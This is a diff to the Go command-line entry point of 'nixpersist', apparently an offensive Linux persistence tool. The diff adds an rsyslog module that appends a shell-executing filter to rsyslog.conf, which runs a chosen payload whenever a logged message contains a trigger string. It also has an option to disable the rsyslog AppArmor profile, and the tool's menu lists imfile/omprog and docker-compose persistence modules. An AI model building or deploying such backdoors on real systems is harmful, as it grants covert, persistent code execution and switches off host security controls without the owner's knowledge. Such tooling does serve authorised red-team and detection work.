@@ -49,8 +49,10 @@ func main() {
 
 	var err error
 	switch module {
+	case "rsyslog-omprog":
+		err = runRsyslogOmprog(moduleArgs)
 	case "rsyslog":
-		err = runRsyslog(moduleArgs)
+		err = runRsyslogShell(moduleArgs)
 	case "docker-compose":
 		err = runDockerCompose(moduleArgs)
 	case "help":
@@ -68,11 +70,11 @@ func main() {
 	}
 }
 
-func runRsyslog(args []string) error {
-	fs := pflag.NewFlagSet("nixpersist rsyslog", pflag.ContinueOnError)
+func runRsyslogOmprog(args []string) error {
+	fs := pflag.NewFlagSet("nixpersist rsyslog-omprog", pflag.ContinueOnError)
 	fs.SortFlags = false
 	fs.Usage = func() {
-		fmt.Fprintln(fs.Output(), "Usage: nixpersist rsyslog [--check|--install|--remove] [--apparmor] [flags]")
+		fmt.Fprintln(fs.Output(), "Usage: nixpersist rsyslog-omprog [--check|--install|--remove] [--apparmor] [flags]")
 		fmt.Fprintln(fs.Output())
 		fmt.Fprintln(fs.Output(), "Flags:")
 		fs.PrintDefaults()
@@ -96,7 +98,7 @@ func runRsyslog(args []string) error {
 	}
 
 	if fs.NArg() > 0 {
-		return fmt.Errorf("unexpected arguments for rsyslog module: %s", strings.Join(fs.Args(), ", "))
+		return fmt.Errorf("unexpected arguments for rsyslog-omprog module: %s", strings.Join(fs.Args(), ", "))
 	}
 
 	if fs.NFlag() == 0 {
@@ -185,7 +187,7 @@ func runRsyslog(args []string) error {
 	}
 
 	if *in == "" || *payload == "" || *trigger == "" {
-		return errors.New("rsyslog render requires -l/--log-file-in, -p/--payload, and -t/--trigger")
+		return errors.New("rsyslog-omprog render requires -l/--log-file-in, -p/--payload, and -t/--trigger")
 	}
 
 	if *out == "" {
@@ -200,6 +202,125 @@ func runRsyslog(args []string) error {
 	return nil
 }
 
+func runRsyslogShell(args []string) error {
+	fs := pflag.NewFlagSet("nixpersist rsyslog", pflag.ContinueOnError)
+	fs.SortFlags = false
+	fs.Usage = func() {
+		fmt.Fprintln(fs.Output(), "Usage: nixpersist rsyslog [--check|--install|--remove] [--apparmor] [flags]")
+		fmt.Fprintln(fs.Output())
+		fmt.Fprintln(fs.Output(), "Flags:")
+		fs.PrintDefaults()
+	}
+
+	doCheck := fs.Bool("check", false, "check system feasibility and exit")
+	doInstall := fs.Bool("install", false, "Append triggerable shell filter to rsyslog.conf")
+	doRemove := fs.Bool("remove", false, "Remove the NixPersist shell snippet and reload rsyslog")
+	manageAppArmor := fs.Bool("apparmor", false, "manage the rsyslog AppArmor profile (disable on install, re-enable on remove)")
+	trigger := fs.StringP("trigger", "t", "hacker", "message substring to trigger on")
+	payload := fs.StringP("payload", "p", "/usr/bin/touch /tmp/nixpersist", "payload binary to execute via shell")
+	output := fs.StringP("output", "o", rsyslog.DefaultShellConfigPath, "path to append the rendered configuration")
+
+	if err := fs.Parse(args); err != nil {
+		if errors.Is(err, pflag.ErrHelp) {
+			return nil
+		}
+		return err
+	}
+
+	if fs.NArg() > 0 {
+		return fmt.Errorf("unexpected arguments for rsyslog module: %s", strings.Join(fs.Args(), ", "))
+	}
+
+	if fs.NFlag() == 0 {
+		fs.Usage()
+		return nil
+	}
+
+	actions := 0
+	if *doCheck {
+		actions++
+	}
+	if *doInstall {
+		actions++
+	}
+	if *doRemove {
+		actions++
+	}
+	if actions > 1 {
+		return errors.New("choose at most one of --check, --install, or --remove")
+	}
+	if *manageAppArmor && actions == 0 {
+		return errors.New("--apparmor requires --install or --remove")
+	}
+
+	if *doCheck {
+		res := rsyslog.Check()
+		fmt.Print(res.Render())
+		return nil
+	}
+
+	if *doRemove {
+		if *manageAppArmor {
+			if err := rsyslog.EnableRsyslogProfile(); err != nil {
+				return fmt.Errorf("failed to re-enable AppArmor profile: %w", err)
+			}
+		}
+		if err := rsyslog.RemoveShell(*output); err != nil {
+			return fmt.Errorf("remove failed: %w", err)
+		}
+		msg := fmt.Sprintf("remove complete: NixPersist shell snippet removed from %s and rsyslog reloaded", *output)
+		if *manageAppArmor {
+			msg += "; AppArmor profile re-enabled"
+		}
+		fmt.Println(msg)
+		return nil
+	}
+
+	params := rsyslog.ShellConfigParams{
+		Trigger: *trigger,
+		Payload: *payload,
+	}
+	cfg, err := rsyslog.RenderShellConfig(params)
+	if err != nil {
+		return err
+	}
+
+	if *doInstall {
+		res := rsyslog.Check()
+		if *manageAppArmor {
+			if err := rsyslog.DisableRsyslogProfile(); err != nil {
+				return fmt.Errorf("failed to disable AppArmor profile: %w", err)
+			}
+		} else if res.RsyslogAppArmorProtected {
+			fmt.Fprintln(os.Stderr, "warning: rsyslog AppArmor profile is enforced; run with --apparmor to disable before install")
+		}
+		if err := rsyslog.InstallShell(cfg, *output); err != nil {
+			return fmt.Errorf("install failed: %w", err)
+		}
+		msg := fmt.Sprintf("install complete: shell snippet appended to %s and rsyslog reloaded", *output)
+		if *manageAppArmor {
+			msg += "; AppArmor profile disabled"
+		}
+		fmt.Println(msg)
+		return nil
+	}
+
+	if strings.TrimSpace(*trigger) == "" || strings.TrimSpace(*payload) == "" {
+		return errors.New("rsyslog render requires -t/--trigger and -p/--payload")
+	}
+
+	outFlag := fs.Lookup("output")
+	if outFlag != nil && outFlag.Changed {
+		if err := os.WriteFile(*output, []byte(cfg), 0644); err != nil {
+			return fmt.Errorf("write failed: %w", err)
+		}
+		fmt.Printf("render complete: shell snippet written to %s\n", *output)
+		return nil
+	}
+
+	fmt.Print(cfg)
+	return nil
+}
 func runDockerCompose(args []string) error {
 	fs := pflag.NewFlagSet("nixpersist docker-compose", pflag.ContinueOnError)
 	fs.SortFlags = false
@@ -306,12 +427,14 @@ func printMainMenu(out io.Writer) {
 	const intro = `Usage: nixpersist [module] [flags]
 
 Available persistence modules:
-  rsyslog          Triggerable rsyslog filter persistence (imfile + omprog)
+  rsyslog          Triggerable rsyslog filter (shell execute)
+  rsyslog-omprog   Triggerable rsyslog filter using imfile + omprog drop-in
   docker-compose   Autostart persistence via docker-compose file
 
 Examples:
   nixpersist rsyslog --check
-  nixpersist rsyslog -l /var/log/auth.log -p /usr/local/bin/payload -t trigger
+  nixpersist rsyslog --install -t hacker -p /usr/local/bin/payload
+  nixpersist rsyslog-omprog --check
   nixpersist docker-compose --check`
 
 	fmt.Fprintln(out, intro)
